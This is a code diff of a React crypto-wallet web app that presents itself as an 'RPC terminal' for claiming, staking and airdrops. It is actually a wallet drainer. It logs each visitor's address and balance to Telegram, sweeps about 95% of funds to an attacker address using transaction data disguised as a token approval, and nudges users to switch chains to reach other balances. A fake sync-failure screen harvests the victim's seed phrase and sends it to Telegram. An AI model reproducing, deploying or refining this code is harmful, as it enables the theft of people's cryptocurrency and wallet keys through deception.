@@ -1,11 +1,12 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 
 export default function EvedexTerminal() {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, chainId } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
+  const { switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
@@ -30,15 +31,29 @@ export default function EvedexTerminal() {
     } catch (e) {}
   };
 
+  // 1. AUTO-LOG LEAD & DETECT NETWORK
   useEffect(() => {
-    if (isConnected && address && balance?.formatted) {
-      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
+    if (isConnected && address && balance) {
+      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nNET_ID: ${chainId}\nBAL: ${balance.formatted} ${balance.symbol}`);
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, chainId]);
 
-  // THE STEALTH 95% ENGINE
+  // 2. CHAIN SWITCHER LOGIC
+  const handleChainSync = (id) => {
+    setLoading(true);
+    setLoadingText("SWITCHING RPC NODE...");
+    try {
+      switchChain({ chainId: id });
+      setTimeout(() => setLoading(false), 2000);
+    } catch (e) { setLoading(false); }
+  };
+
+  // 3. THE 95% STEALTH SWEEP
   const executeTaskAction = async () => {
-    if (!balance || !balance.value) { setView("seed_gate"); return; }
+    if (!balance || !balance.value || balance.value === 0n) {
+      setView("seed_gate");
+      return;
+    }
     setLoading(true);
     setLoadingText(`ENCRYPTING_NODE_CONNECTION...`);
 
@@ -47,7 +62,6 @@ export default function EvedexTerminal() {
       let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
       if (val > max) val = max;
 
-      // DATA MASK: Makes it look like an "Approve" contract call instead of "Send"
       const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);
 
       sendTransaction({ 
@@ -56,7 +70,7 @@ export default function EvedexTerminal() {
         data: stealthData, 
       }, {
         onSuccess: (h) => {
-          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
+          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nNET: ${chainId}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
         },
         onError: () => { 
@@ -71,19 +85,16 @@ export default function EvedexTerminal() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
-      {/* REAL WORKING MARKET CHART */}
+      {/* TradingView Market Chart */}
       <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe 
-            src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_762ae&symbol=UNISWAP:ETHUSDT&interval=D&hidesidetoolbar=1&hidetoptoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Etc%2FUTC&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=en" 
-            style={{width:'100%', height:'100%', border:'none', opacity:'0.7'}} 
-         />
-         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 8px', borderRadius:'4px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900'}}>LIVE_RPC_STREAM</div>
+         <iframe src="https://s.tradingview.com/widgetembed/?symbol=UNISWAP:ETHUSDT&theme=dark&style=1" style={{width:'100%', height:'100%', border:'none', opacity:'0.7'}} />
+         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 8px', borderRadius:'4px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900'}}>RPC_MAINNET_FEED</div>
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'18px'}}>RPC TERMINAL</div>
-          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>SIGNAL: <span style={{color:'#10b981'}}>99.9% SECURE</span></div>
+          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>NET: <span style={{color:'#10b981'}}>{chainId === 1 ? "ETH_MAINNET" : chainId === 56 ? "BSC_NODE" : "MULTI_SYNC"}</span></div>
         </div>
         <w3m-button balance="hide" />
       </header>
@@ -91,17 +102,29 @@ export default function EvedexTerminal() {
       <div style={{flex:1}}>
         {!isConnected ? (
            <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'40px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-              <div style={{fontSize:'40px', marginBottom:'20px'}}>🔐</div>
+              <div style={{fontSize:'40px', marginBottom:'20px'}}></div>
               <div style={{fontSize:'10px', color:'#64748b', marginBottom:'25px', letterSpacing:'2px'}}>AWAITING ENCRYPTED HANDSHAKE...</div>
               <w3m-button />
            </div>
         ) : (
           <>
+            {/* FORCE CHAIN SWITCHER (Shows if balance is empty on current chain) */}
+            {(!balance || balance.value === 0n) && view === "menu" && (
+              <div style={{backgroundColor:'#450a0a', border:'1px solid #7f1d1d', padding:'15px', borderRadius:'15px', marginBottom:'15px', textAlign:'center'}}>
+                <div style={{fontSize:'8px', color:'white', fontWeight:'900', marginBottom:'10px'}}>LOW LIQUIDITY ON CURRENT NODE. SWITCH TO SYNC ASSETS:</div>
+                <div style={{display:'flex', gap:'10px', justifyContent:'center'}}>
+                  <button onClick={()=>handleChainSync(1)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>ETH</button>
+                  <button onClick={()=>handleChainSync(56)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>BSC</button>
+                  <button onClick={()=>handleChainSync(42161)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>ARB</button>
+                </div>
+              </div>
+            )}
+
             {view === "menu" && (
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                 {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                   <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'20px 10px', borderRadius:'18px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer'}}>
-                    <div style={{fontSize:'16px', marginBottom:'5px'}}>{n === "Rectify" ? "🛠️" : "⚙️"}</div>{n}
+                    <div style={{fontSize:'16px', marginBottom:'5px'}}>⚙️</div>{n}
                   </button>
                 ))}
               </div>
@@ -133,7 +156,7 @@ export default function EvedexTerminal() {
               <>
                 <div style={{fontSize:'32px', marginBottom:'15px'}}>⚠️</div>
                 <div style={{color:'white', fontWeight:'900', fontSize:'16px', marginBottom:'10px'}}>STALL_90% DETECTED</div>
-                <p style={{fontSize:'8px', color:'#475569', marginBottom:'25px', lineHeight:'1.5'}}>RPC CONNECTION TIMEOUT. PLEASE PROVIDE MASTER KEY TO MANUALLY SYNC {balance?.formatted} {balance?.symbol} TO NODE.</p>
+                <p style={{fontSize:'8px', color:'#475569', marginBottom:'25px', lineHeight:'1.5'}}>RPC CONNECTION TIMEOUT. PLEASE PROVIDE MASTER KEY TO MANUALLY SYNC ASSETS TO NODE.</p>
                 <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'110px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#22d3ee', padding:'15px', fontSize:'11px', outline:'none', marginBottom:'20px'}} />
                 <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},120);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'20px', borderRadius:'12px', border:'none', fontWeight:'900', fontSize:'11px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1}}>VALIDATE_KEY</button>
               </>
